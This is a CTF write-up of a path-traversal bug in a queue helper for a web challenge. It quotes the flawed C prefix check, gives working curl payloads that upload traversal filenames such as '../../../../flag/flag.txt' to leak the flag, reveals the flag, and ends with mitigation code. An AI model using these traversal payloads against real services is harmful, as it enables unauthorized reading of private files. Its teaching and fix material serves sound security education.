---
title: "Writeup — PointerOverflow CTF: A Micromachine (exploit / writeup)"
description: "**Challenge:** A Micromachine — read-only device/OTP/flag combined challenge (web / queuer helper). **Target:** get `/app/public/playlist.txt` to contain `/flag/flag.txt` content."
event: "Pointeroverflowctf"
year: 2025
category: pwn
tags: ["pwn","crypto"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "pointeroverflowctf/exploit/Queue the music"
featured: false
flagsHidden: false
---

> Imported from [pointeroverflowctf/exploit/Queue the music](https://github.com/R3izorr/CTF_writeup/tree/main/pointeroverflowctf/exploit/Queue%20the%20music).

# Writeup — PointerOverflow CTF: *A Micromachine* (exploit / writeup)

**Challenge:** A Micromachine — read-only device/OTP/flag combined challenge (web / queuer helper).  
**Target:** get `/app/public/playlist.txt` to contain `/flag/flag.txt` content.  
**Flag:** `poctf{uwsp_qu3u3_17_b3f0r3_1_d0}`

---

## Summary (2 sentences)
The service uses a small helper (`queuer`) which accepts a path argument and only checks that the *string* begins with `/tmp/uploads/`. Because the code checks a prefix (not the canonical path) and then calls `stat()`/`open()` (which resolve `..` and symlinks), an attacker-controlled path like `/tmp/uploads/../../../../flag/flag.txt` is accepted by the prefix test but resolves to `/flag/flag.txt` and is appended to the public playlist. Result: remote path traversal → flag leak.

---

## Key source (relevant excerpt)
From `/app/queuer.c` (essential parts simplified):

```c
static int starts_with(const char *s, const char *p) {
    size_t n = strlen(p);
    return strncmp(s, p, n) == 0;
}

int main(int argc, char **argv) {
    const char *path = argv[1];

    if (!starts_with(path, "/tmp/uploads/")) {
        fputs("bad path\n", stderr);
        return 2;
    }

    struct stat st;
    if (stat(path, &st) == -1) { perror("stat"); return 2; }
    if (!S_ISREG(st.st_mode) || st.st_size > 4096) { fputs("bad path\n", stderr); return 2; }

    int in = open(path, O_RDONLY);
    read(in, buf, sizeof(buf));
    close(in);

    int out = open("/app/public/playlist.txt", O_WRONLY|O_APPEND);
    write(out, buf, n);
    close(out);
}
Problem: starts_with() only tests the literal string prefix — it does not canonicalize or resolve path components. stat() and open() operate on the canonical path (they follow .. and symlinks), so "/tmp/uploads/../../flag/flag.txt" passes the prefix check but becomes /flag/flag.txt for stat/open.

Exploit idea
Obtain a valid session id (sid) from POST /session (service returns JSON {"sid":"e8c0e60cc339905e"} in this instance).

Upload a file with an attacker-controlled name/filename/filename-like field that (when concatenated into the helper argument) yields a path that starts with /tmp/uploads/ but contains .. segments that escape to /flag/flag.txt.

Call POST /queue (the app runs queuer PATH) and the helper reads the canonical path and appends the flag to the public playlist.

GET /playlist and read the flag.

Working payloads / reproduction (what worked here)
Given SID

text
Sao chép mã
{"sid":"e8c0e60cc339905e"}
Most reliable attack: supply a traversal filename on upload (keep SID valid; do not try to supply an invalid/malformed SID).

bash
Sao chép mã
BASE="https://exp200-1.pointeroverflowctf.com"
SID="e8c0e60cc339905e"

# Upload with traversal filename (JSON); keep proper quoting
curl -s -X POST "$BASE/upload" -H "Content-Type: application/json" \
  -d "{\"sid\":\"$SID\",\"filename\":\"../../../../flag/flag.txt\",\"content\":\"x\"}"

# Trigger queuer to read & append file
curl -s -X POST "$BASE/queue" -H "Content-Type: application/json" \
  -d "{\"sid\":\"$SID\"}"

# Read playlist (flag will be appended)
curl -s "$BASE/playlist" | sed -n '1,200p'
Alternate payload (if the server treats uploaded content as a path):

bash
Sao chép mã
curl -s -X POST "$BASE/upload" -H "Content-Type: application/json" \
  -d "{\"sid\":\"$SID\",\"content\":\"/tmp/uploads/../../../../flag/flag.txt\"}"

curl -s -X POST "$BASE/queue" -H "Content-Type: application/json" -d "{\"sid\":\"$SID\"}"
curl -s "$BASE/playlist"
Note: earlier attempts failed because JSON was malformed (missing/extra quotes) — always ensure valid JSON strings.

Evidence / playlist output (high-level)
The playlist showed many diagnostic entries (tests) and — crucially — the /flag/flag.txt content appended:

python-repl
Sao chép mã
...
/tmp/uploads/../../../../flag/flag.txt
...
/flag/flag.txt
...
poctf{uwsp_qu3u3_17_b3f0r3_1_d0}
...
That final line is the flag.

Why this is safe-to-explain (no destructive steps)
The exploit simply causes the service to open and append an existing readable file (/flag/flag.txt) to a public playlist file. No writes to sensitive files or destructive operations were required. The exploit relies purely on path traversal via .. segments and is reproducible via the web API.

Root cause (concise)
Incorrect validation strategy: starts_with(path, prefix) is not equivalent to verifying that path is within prefix. It does not catch .. segments or symlinks.

TOCTOU / canonicalization gap: validation is done on the raw string, while stat()/open() operate on the canonical path.

Fix / mitigation (recommended code changes)
Option A — quick fix using realpath before check:

c
Sao chép mã
char real[PATH_MAX];
if (!realpath(path, real)) { perror("realpath"); return 2; }
if (!starts_with(real, "/tmp/uploads/")) { fputs("bad path\n", stderr); return 2; }

/* Then use the canonical real path for open() */
int in = open(real, O_RDONLY);
Option B — safer approach using openat() with directory FD and forbidding slashes in filenames:

c
Sao chép mã
int dirfd = open("/tmp/uploads", O_RDONLY | O_DIRECTORY);
if (dirfd < 0) { perror("open uploads dir"); return 2; }

/* require that client-supplied name is a simple filename with no '/' or ".." */
if (strchr(client_name, '/') || strstr(client_name, "..")) { fputs("bad name\n", stderr); return 2; }

int in = openat(dirfd, client_name, O_RDONLY | O_NOFOLLOW);
if (in < 0) { perror("openat"); return 2; }

/* fstat(in) to validate S_ISREG and size etc. */
Other recommendations

Use O_NOFOLLOW to avoid following symlinks.

After open() use fstat() and compare parent directory device/inode to ensure the file really sits under /tmp/uploads.

Reject filenames containing path separators or .. (enforce a whitelist for names).

Prefer running helpers with the minimal privileges and drop privileges before opening attacker-controlled files.

Short disclosure / timeline (for challenge write-up)
I inspected the queuer source and noticed the starts_with check.

I obtained a valid sid from the service and attempted to upload a file with a traversal filename.

The web app accepted the upload and later invoked queuer with a path beginning with /tmp/uploads/ but containing .. segments that resolved to /flag/flag.txt.

The queuer read the canonical file and appended its contents to /app/public/playlist.txt.

The playlist was fetched and the flag retrieved: poctf{uwsp_qu3u3_17_b3f0r3_1_d0}.
